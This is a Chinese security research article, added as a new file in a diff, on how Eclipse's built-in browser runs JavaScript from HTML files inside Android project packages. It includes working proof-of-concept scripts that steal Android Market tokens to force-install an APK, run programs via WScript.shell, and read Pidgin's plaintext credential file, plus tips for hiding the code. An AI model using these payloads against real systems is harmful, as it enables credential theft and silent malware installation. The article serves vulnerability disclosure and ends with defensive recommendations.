@@ -1,0 +1,288 @@
+Android应用安全之开发环境带来的危险
+
+by SuperHei_at_www.80vul.com
+
+
+一、前言
+
+   在去年的文档《WEB2.0下的渗透测试》里提到了一点就是在2.0时代，攻击者的攻击方式
+是针对攻击的目标身份而变化的。对于开发人员来说，开发环境的安全问题一直是被忽视
+的，虽然这类问题提了很多年了。本文就是以andriod开发环境里编辑器的一个小问题展开
+的...
+
+二、android的开发环境简介
+
+    1、安装JDK ：http://www.oracle.com/technetwork/java/javase/downloads/index.html
+    2、安装Eclipse ：http://www.eclipse.org/downloads/
+    3、安装ADT插件：打开Eclipse，依次Help--->install new software-->ADD-->Location：
+       https://dl-ssl.google.com/Android/eclipse/-->OK
+    4、安装Android SDK
+
+三、Eclipse的浏览器的漏洞
+   
+    以上环境配置好了后，对于开发人员来说最常用的肯定就是IDE了也就是著名的编辑器
+Eclipse，在我使用Eclipse的过程中发现了一个小问题，那就是Eclipse的浏览器在windows
+下直接调用IE内核来实现的，而在非windows下使用的是WEBKit核心的浏览器。对于这样的简
+陋的浏览器有一个通病，那就是安全防御薄弱。具体在Eclipse里，有个致命的问题那就是，
+当开发者点击html文件时，默认情况下，它调用的不是编辑界面，而是浏览器里运行！而且
+是没有任何安全提示下通过file://伪协议下执行html文件里的javascript代码，大家都知
+道，可以在file://里执行js就意味着一个“跨域”漏洞可能....
+
+四、apk代码结构与html文件
+
+    下面是我在网络上下载的一个apk代码包，它的目录结构如下：
+C:\android\Test>tree /f
+文件夹 PATH 列表
+C:.
+│  .classpath
+│  .project
+│  AndroidManifest.xml
+│  proguard.cfg
+│  project.properties
+│  readme.htm
+│
+├─assets
+│      index.htm
+│
+├─bin
+│  ├─classes
+│  │  └─com
+│  │      └─szy
+│  │          └─test
+│  │                  MainActivity.class
+│  │
+│  ├─com
+│  │  └─szy
+│  │      └─test
+│  │              MainActivity.class
+│  │
+│  └─res
+├─gen
+├─res
+│  ├─drawable-hdpi
+│  │      icon.png
+│  │
+│  ├─drawable-ldpi
+│  │      icon.png
+│  │
+│  ├─drawable-mdpi
+│  │      icon.png
+│  │
+│  ├─layout
+│  │      main.xml
+│  │
+│  └─values
+│          strings.xml
+│
+└─src
+    └─com
+        └─szy
+            └─test
+                    MainActivity.java
+
+在这个代码里我看到了两处html文件:
+1、./readme.htm 这个常用的代码作者提过的readme文件。
+2、./assets/index.htm res目录和assets目录是存放资源文件的两个目录，不同的是/assets
+目录下的资源文件不会在R.java自动生成ID。
+
+所以这个2个地方将是我们放置和html文件引入邪恶的javascript绝佳场所！！ 
+
+五、通向手机之路
+
+我们在要实现从PC上到手机上安装执行我们的恶意apk，常用的有2个途径：
+
+1、在手机通过USB连接到PC的情况下，使用adb shell来控制。
+2、在pc浏览器登录到market[https://market.android.com/]上下载安装apk。
+
+下面我们看看怎么通过Eclipse的浏览器执行JS来实现上面的两个途径：对于Eclipse的浏览
+器在windows和非windows平台上的设计是不相同的，那就决定了我们的攻击方式的不同。
+
+A、windows平台下的途径
+
+windows平台下Eclipse的浏览器是基于IE内核(Trident)的，对于IE来说file://下执行的
+js就意味着拥有“我的电脑”域的权限，虽然微软在IE的安全上做了不少工作，但是在本地
+文件的安全还远远不够，最起码file://下的xmlhttp完全不设防...，另外微软更多的安全措
+施是基于ie的，而不是ie内核(Trident)上的，所以对于第三方的ie内核浏览器的安全防御那
+就更加薄弱了。
+
+a、通过market的方式
+在windows下Eclipse的浏览器是基于IE内核来实现的，对于IE内核的浏览器来说，有个特点
+那就是Cookie通用，也就是说IE登录market后，Eclipse的浏览器也在登录market的状态。所
+以我们就可以通过我们插入的js来实现跨market.android.com域，在market上任意执行js，
+来实现恶意apk的下载安装。当然这个的前提是你可以把你的恶意代码放到market上，如果是
+用你自己的号，那么你最起码需要支付25刀的开户费给Google，不过或许你可以直接使用被
+攻击者的帐号？！ 另外你的apk需要通过google的审查！ 所谓“道理是曲折的，前途是光明
+的”？ ：）
+
+这个过程如下：
+
+  攻击者-->上传包含了恶意Html文件的代码包 ------------+---------------+-------------------+-----------------------+---------------上传恶意APK到 market.android.com                           
+                     ||                                                                                                                  || 
+被攻击者-->下载包含了恶意Html文件的代码包-->Eclipse的浏览器打开恶意html[JS]-->通过跨域到market.android.com-->JS实现自动下载安装恶意APK-->Mobile[andoid]
+
+
+其实这个过程类似于market.android.com上xss攻击的效果，详见大牛jonoberheide的blog
+《How I Almost Won Pwn2Own via XSS》[1]
+
+演示代码如下：
+
+<script>
+var request = false;
+        if(window.XMLHttpRequest) {
+            request = new XMLHttpRequest();
+            if(request.overrideMimeType) {
+                request.overrideMimeType('text/xml');
+            }
+        } else if(window.ActiveXObject) {
+            var versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP', 
+            'Msxml2.XMLHTTP.7.0','Msxml2.XMLHTTP.6.0','Msxml2.XMLHTTP.5.0', 
+            'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];
+            for(var i=0; i<versions.length; i++) {
+                try {
+                    request = new ActiveXObject(versions[i]);
+                } catch(e) {}
+            }
+        }
+        
+xmlhttp=request;
+
+var apkid="com.tencent.qqpimsecure";
+
+xmlhttp.open("GET", "https://market.android.com/", false);
+xmlhttp.send(null);
+var ret = xmlhttp.responseText;
+
+var regx = /userEmail: '(.*)', userG/
+var rs= regx.exec(ret);
+var gmail = rs[1];
+
+var regx = /selectedDeviceId: '(.*)', absoluteBaseUrl/
+var rs= regx.exec(ret);
+var deviceId = rs[1];
+
+var regx = /token: '(.*)', locale/
+var rs= regx.exec(ret);
+var token = rs[1];
+
+alert("gmail:"+gmail+"\n"+"DeviceId:"+deviceId+"\n"+"token:"+token);
+
+xmlhttp.open("POST", "https://market.android.com/install", false);
+xmlhttp.setRequestHeader("Referer", "https://market.android.com/");
+xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+xmlhttp.send(unescape("id="+apkid+"&offerType=1&device="+deviceId+"&xhr=1&token="+token));
+
+</script>
+
+b、通过WSH执行adb shell的方式
+在ie内核的浏览器里file://本地文件是在“我的电脑”域执行的[在没有MOTW标志的情况
+下]，在“我的电脑”域是可以执行WSH的只不过，在多年的缝缝补补下IE执行WSH是有安全提
+示的，不过对于一些没有安全意识开发人员来说，或许很容易点击"YES"?！！ 演示代码如下：
+
+<script>new ActiveXObject("WScript.shell").Run('calc.exe',1,true);</script>
+
+
+B、非windows平台下的途径
+
+对于market途径来说，Eclipse的浏览器是通过webkit来实现的，它没有IE那样的特性，所以
+如果要通过market来实现的话，前提条件是Eclipse的浏览器的浏览器已经登录了market，要
+不然是没有办法的。然后webkit也没有类似与WSH等直接的方法，那么我们还有什么思路呢？
+和IE内核的第三方浏览器一样，第三方的防御都很薄弱，比如这里的Eclipse的浏览器，对于
+xmlhttp读取本地文件也是被允许的。所以如果有本地google的帐号密码保存的文件，我们读
+取后直接登录market了...，一切都有可能！Pidgin保存的用户帐号密码都是用明文方式保存
+在~/.purple/accounts.xml文件里，只要被攻击者是使用Pidgin登录Gtalk的话，我们就有机
+会！！！
+
+对于～目录，是当前用户目录，所以使用绝对路径时需要知道系统用户名，这个不太好得
+到，那么对于Eclipse的workspace目录也是在～目录下，那么我们就可以用相对路径的方式
+来读取accounts.xml，而不需要知道系统用户名，演示代码如下：
+
+<script>
+function XMLHttp() { xmlhttpOK = false; var xmlhttp=null; if (window.XMLHttpRequest){ 
+xmlhttp = new XMLHttpRequest(); } else{ 
+ if (window.ActiveXObject){ try { 
+              xmlhttp = new ActiveXObject("Msxml2.XMLHTTP"); 
+          } catch(e) {
+             xmlhttp = new ActiveXObject("Microsoft.XMLHTTP"); 
+               } 
+            }
+        }
+        return xmlhttp; 
+    }
+    
+var xhr=new XMLHttp();
+function postURLRet(url, data){
+    if(xhr)    {
+        xhr.open("POST",url,false);
+        xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
+        xhr.send(data);
+        return xhr.responseText;
+    }
+    return "";
+}
+var ret = postURLRet("../../../.purple/accounts.xml", null);
+alert(ret);
+</script>
+
+六、消失的代码
+
+对于有点安全意识的开发人员来说，有可能查看代码，对于windows平台来说，ie内核的浏览
+器是支持“右键-->查看源文件“的经典方式的，在非windows平台下的webkit方式不支持这
+种方式。对于这样的方式查看代码的方式我们可以所用“Original Source Forgery”(详见[2])
+的方法来让我们的代码“消失”。
+
+不过值得注意的是，原来代码里的直接使用的是：
+
+ajax('GET',location, 
+	function(req){
+       ....
+}
+
+ajax函数里直接使用location但是目前ie已经禁止使用xmlhttp请求本地文件了,所以我们可
+以把你的恶意html文件copy一份在远程的web主机上，然后使用http,或者你自己手工写在代
+码里。
+
+但是对于Eclipse来说打开html只是默认打开方式是浏览器，也就是说好友其他的方式（选择
+html文件右键-->Open With）其中有个“Text Editor”方式打开的话，你的代码还是一览无
+遗。不过对于老版本的Eclipse来说，编辑器存在着一个漏洞可以隐藏你的代码：
+《Nullbytes hide code on Eclipse 3.5》 by Mario Heiderich [3]
+
+
+七、恶意apk的实现
+这里不是说怎么去实现一个恶意的apk，只是简单的说2个问题：
+
+在上面通过market的方式在目标的手机上安装了你的apk，但是不会立刻马上启动你的apk，
+所以第一个问题就是怎么启动你的apk：
+
+A、通过BroadcastReceiver的组建实现，这个的结果是必须等待手机的重启。
+B、通过设置android:scheme的方法，通过被动的触发这个scheme来实现启动[比如通过短信
+或者邮件的方式发送url,url页面里代码使用<iframe src=scheme://xx>来启动]。
+
+第二个问题的是“恶意apk的职能”，也就是说你的控制目标手机的目的，就目前市面上的
+Android Malware来看基本都是以盗取信息为目的，对于大炒APT(Advanced Persistent 
+Threat)的时代，对于移动设备控制的目的应该有新的诠释，移动设备在APT过程里应该只是
+流程的一个小部分，也就是把你的带入目标网络里的一个途径。所以就这个目的来看，以后
+的恶意apk开发可能围绕局域网里的网络自动扫描攻击而展开...
+
+
+八、小结
+
+上面提到主要有下面几个问题：
+
+1、 Eclipse的问题：
+     i、默认方式所用了浏览器方式打开html文件。
+    ii、浏览器对javascript没有安全提示就直接运行。
+2、 Android market对于下载安装等敏感操没有考虑防御xss下的csrf情况[如所用验证码的方式]。
+
+很多人把一些安全问题归结到"用户缺少安全意识"的结论上，其实不然，对于现在的安全理
+念我们的"官方"应该考虑到某些用户存在着"缺少安全意识"情况，所以在我们的功能或者
+UI设计上要考虑到这中情况，尽量减少"安全隐患"，比如上面提到的Eclipse在处理html文件
+的方式上，可以改为默认为编辑状态。另外对于Android market应该考虑到得到token的情况
+下的csrf的情况，可以考虑危险的操作可以设置验证码等等，一切都以"不要你的用户为安全
+漏洞买单"为目标，这才是王道！
+
+九、参考
+[1]http://jon.oberheide.org/blog/2011/03/07/how-i-almost-won-pwn2own-via-xss/
+[2]http://www.scriptjunkie.us/2011/09/original-source-forgery/
+[3]https://bugs.eclipse.org/bugs/show_bug.cgi?id=283231
+
+-EOF-
